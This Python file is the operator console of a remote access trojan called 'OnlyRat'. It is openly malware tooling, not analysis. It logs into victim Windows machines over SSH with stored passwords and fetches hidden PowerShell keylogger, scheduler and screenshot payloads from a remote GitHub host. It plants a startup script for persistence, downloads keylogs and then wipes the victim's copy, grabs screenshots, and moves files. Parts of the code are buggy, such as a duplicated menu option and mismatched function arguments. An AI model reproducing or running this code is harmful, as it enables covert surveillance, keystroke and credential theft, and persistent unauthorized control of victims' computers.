#!/usr/bin/python3
# python console for OnlyyRatt


# imports
import os 
import sys
import random as r
from modules import *
from art import *
from datetime import datetime as dt
from PIL import Image
# for obfs 
def random_text():
    lower_case="abcdefghijklmnopqrstuvwxyz"
    upper_case=lower_case.upper()

    characters=lower_case+upper_case
    generated_text=""

    for i in range(10):
        generated_text += r.choice(list(characters))

    return generated_text


# get from the username
username=os.environ["USER"]
print(username)
header=f"[~] {username}@ratty $ "
remote_path="raw.githubusercontent.com/carlocarlo123/RATTY/main"
local_path=f"/home/{username}/Desktop"
# create a hidden folder for our malwaRE PANEL
local_path="/home/kali/Desktop/Malware development/OnlyRat"
help_menu="""
                Arguments:
                    xxx.rat =configuration file to add to onlyrat


                Example:
                    python3 main.py -f bluecusmo.rat
"""
options_menu="""
                [*] select A Number To select A Payload [*]


                payloads:
                    [0] Remote Console 
                    [1] Install Keylogger
                    [2] Grab keylogs
                    [3] Install Screenshot
                    [4] Grab Screenshots
                    [5] upload File
                    [6] download File
                    [5] Restart Target PC
"""
# read the config file
def read_config(config_file):
    configuration={}
    # get file content
    read_lines=open(config_file,"r").readlines()
    configuration["IP"]=read_lines[0].strip()
    configuration["PASSWORD"]=read_lines[1].strip()
    configuration["WORKINGDIRECTORY"]=(read_lines[2]).replace("\\","/").strip()
    configuration["USERNAME"]=read_lines[2][9:-20]
    configuration["STARTUPDIRECTORY"]=(read_lines[3]).replace("\\","/").strip()
    return configuration



def os_detection():
    if os.name=="nt":
    
        return "W"

    if os.name=="posix":
        return  "l"
# connects def to targets
def connect(address,password):
    # REMOTELY CONNECT TO THE TARGET and open powershell
    os.system(f'sshpass -p {password} ssh onlyrat@{address} \"powershell\"')

def remote_uplaod(address,password,upload_file,path):
    # remote 
    os.system(f"sshpass -p  \"{password}\" scp {upload_file} onlyrat@{address}:{local_path}")


def remote_download(address,password,download_file,path):
    # remote 
    print("\n[*] Starting Download.....")
    os.system("mkdir ~/Download")
    os.system(f"sshpass -p \"{password}\" scp -r  onlyrat@{address}:{path} ~/Downloads")

# remotely commands
def remote_commands(address,password,command):
    # remote command execution
    try:
        os.system(f'sshpass -p \"{password}\" ssh \"onlyrat@{address}\" \"{command}\"')
    except :
        print(f"{command} was not sent ! Try again")

def rename_screenshot():
    valid_extension='.jpg'
    # get the working directory
    folder_path="/home/kali/Downloads"
    # get all the files from the folder
    file_names=os.listdir(folder_path)
    # for each file
    for file_name in file_names:
        # get the file extension 
        file_ext=os.path.splitext(file_name)[1]
        if (file_ext!=valid_extension):
            continue
        # Create the old file path
        old_file_path = os.path.join(folder_path, file_name)
            # Open the image
        image = Image.open(old_file_path)
        # Get the date taken from EXIF metadata
        date_taken = image._getexif()[36867]
        # Close the image
        image.close()
        # Reformat the date taken to "YYYYMMDD-HHmmss"
        date_time = date_taken \
            .replace(":", "")      \
            .replace(" ", "-")
        # Combine the new file name and file extension
        new_file_name = date_time + file_ext
        # Create the new folder path
        new_file_path = os.path.join(folder_path, new_file_name)
        # Rename the file
        os.rename(old_file_path, new_file_path)
 






def Keylogger(address,password,username,working):
    # for iinstalling the keylogger
    Keylogger_command=f'cd {working} && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/keylogger.ps1 -OutFile KWEDSBDgfe.ps1'
    # for installing the ss
    scheduler_command=f'cd {working} && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/schedular.ps1 -OutFile SOzxasweAK.ps1'
    # for instaling the controller
    controller_command=f'cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd "Start Menu" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/controller.cmd -OutFile BEkxzUzcnT.cmd'
    # execute the keylogger
    execute_keylogger=f'cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd "Start Menu" && cd Programs/Startup && BEkxzUzcnT.cmd'

    try:
        print("[*] installing the keylogger.........")
        remote_commands(address,password,Keylogger_command)
        print("[*] installing the schedular.........")
        remote_commands(address,password,scheduler_command)
        print("[*] installing the controller.........")
        remote_commands(address,password,controller_command)
        print("[+] keylogger installed successfully")

        print("\n[*] executing the keylogger.........")
        remote_commands(address,password,execute_keylogger)
    except Exception as e:
        print(e)

def Install_ScreenShot(address,password,username,working):
    # make the command to take the screenshot
    print("[*] installing the screenshot.........")
    install_screenshot=f'cd {working}  && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/screenshot.ps1 -OutFile UEsQRWCLHV.ps1'
    # run the commnads
    remote_commands(address, password, install_screenshot)
    # add to startup directory
    add_to_startup=f'cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd "Start Menu" && cd Programs/Startup && echo powershell.exe  -windowstyle hidden -File {working}/UEsQRWCLHV.ps1 >> BEkxzUzcnT.cmd'
    remote_commands(address, password, add_to_startup)
    # take screen shots
# get current date and time
def current_time():
    current=dt.now()
    return current.strftime("%d/%m/%Y_%H-%M-%S")

def Grab_ScreenShot(address,password,working,username):
    # make the command to take the screenshot
    print("[*] Taking the screenshot.........")
    take_screenshot_command=f'cd {working} && mkdir ASGHbvcQPW && powershell powershell.exe .\\UEsQRWCLHV.ps1 > ASGHbvcQPW'
    remote_commands(address, password, take_screenshot_command)

    print("\n[*] screenshot taken successfully AND SAVED TO ASGHbvcQPW FOLDER\n")
    screenshot_location=f"{working}/ASGHbvcQPW"
    remote_download(address, password,screenshot_location)
    print(f"[*] screenshots downloaded successfully")

    print("[*] Formating screenshots.........")
    loot_folder=f"screenshots-{username}-{current_time()}"
    os.system(f"mkdir ~/Downloads/{loot_folder}")
    os.system(f"mv ~/Downloads/ASGHbvcQPW/* ~/Downloads/{loot_folder}")
    os.system(f"rm -rf ~/Downloads/ASGHbvcQPW")
    print("\n[*] screenshot renamed successfully on your  PC and its located in ~/Downloads \n")

def upload(address,password,wokring):

    print("\n[~] Enter file you wish to upload")
    upload_file=input(header)

    print("[*] uploading ...........")
    remote_uplaod(address, password, upload_file, working)
    print("[+} uploaded successfully........")





def update():

    print("\n[*] Checking for updates......")
    # get the latest version 
    # tee used to coopy from url to the latest.txt file in the hidden directory
    os.system(f"curl https://raw.githubusercontent.com/carlocarlo123/RATTY/main/version.txt |tee /home/kali/Desktop/Malware development/OnlyRat/latest.txt")


    # save the version numbers to memroy
    current_version=float(open(f"{local_path}/version.txt","r").read())
    latest_version=float(open(f"{local_path}/latest.txt","r").read())

    os.system(f"rm -rf /home/kali/Desktop/Malware development/OnlyRat/latest.txt")


    # if new vesion is avaliable update
    if latest_version > current_version:
        print("\n[+] update found")
        print("[*] update onlyrat ?[y/n]\n")
        # user input 
        option=input(f"{header}")
        # update
        if option=="y":
            os.system(f"sh /home/kali/Desktop/Malware development/OnlyRat/payloads/update.sh")


        else:
            main()


# get the argument
def parser():
    pass
# terminate the programmm
def exit():
    sys.exit()

# get current date and time
def current_time():
    current=dt.now()

    return current.strftime("%d/%m/%Y_%H-%M-%S")


# command line interface
def cli(argument):
    # print the tprint for only rat
    tprint("Only Rat")
    # check if the argument exists
    if argument:
        # print the option menu
        print(options_menu)
        option=input(f"{header}")
        try:
            configuration=read_config(sys.argv[1])

        except FileNotFoundError:
            print("\n[!!] file does not exit [!!]\n")
            exit()
        # get the data for connection
        ipv4=configuration.get("IP")
        password=configuration.get("PASSWORD")
        working_directory=configuration.get("WORKINGDIRECTORY")
        startup_directory=configuration.get("STARTUPDIRECTORY")
        target_username=configuration.get("USERNAME")
        if option=="0":
            try:
                connect(ipv4,password)
            except Exception as e:
                print(e)
        elif option=="1":
            print(username)
            Keylogger(ipv4,password,target_username,working_directory)

        elif option=="2":
            remote_download(ipv4, password, f"{working_directory}/{target_username}.log")
            remote_commands(ipv4, password,f"powershell New-Item -path {working_directory}/{target_username}.log -ItemType File -Force" )
            print("[+] log file saved to  \"~/Downloads\"")
            print("[+] log file on target has been wiped\n")
        # screen shots for the victims
        elif option=="3":
            try:
                Install_ScreenShot(ipv4,password,target_username,working_directory)
            except Exception as e:
                pass
        elif option=="4":
            Grab_ScreenShot(ipv4,password,target_username,working_directory)
        elif option=="5":
            upload(ipv4,password,working_directory)
        elif option=="5":
            remote_commands(ipv4, password, "shutdown /r")
    else:
        print(help_menu)
# main code
def main():
    try:
        sys.argv[1]
    except IndexError:
        args_exist=False
    else:
        args_exist=True
    

    # run the cli what we want from the ratty
    cli(args_exist)



# run the main code
if __name__=='__main__':
    main()